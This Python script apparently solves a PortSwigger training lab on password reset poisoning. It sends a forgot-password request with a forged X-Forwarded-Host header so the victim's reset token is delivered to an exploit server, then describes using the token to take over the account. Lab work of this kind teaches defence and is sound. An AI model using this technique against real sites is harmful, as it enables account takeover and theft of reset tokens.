"""
Lab 5: Password reset poisoning via middleware
https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning
Difficulty: Practitioner

📝 Same underlying flaw as Lab 1, but via X-Forwarded-Host (not the
primary Host header — that one IS validated here) and triggered via
middleware SERVER-SIDE, meaning the poisoned request to our exploit server
happens immediately, with no victim click required.
"""

from utils import get_session, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
EXPLOIT_SERVER_HOST = "exploit-YOUR-LAB-ID.exploit-server.net"  # no scheme, no trailing slash
VICTIM = "carlos"


def run():
    s = get_session()

    note("Note: use the bare hostname only for X-Forwarded-Host — including")
    note("https:// or a trailing slash causes a 400 'Host header not")
    note("present' error on this specific lab.")

    r = s.post(
        f"{TARGET}/forgot-password",
        headers={"X-Forwarded-Host": EXPLOIT_SERVER_HOST},
        data={"username": VICTIM},
    )
    log(f"Status: {r.status_code}")

    note("Check the exploit server's access log immediately — this should")
    note(f"land right away as a GET /forgot-password?temp-forgot-password-token=...")
    note("request, since the middleware itself makes the poisoned request")
    note("rather than waiting on carlos to click anything.")

    note("Separately, trigger your OWN reset (as wiener) to get a legit")
    note("email with a valid-format reset link, then swap in carlos's")
    note("stolen token value and submit a new password for his account.")


if __name__ == "__main__":
    run()
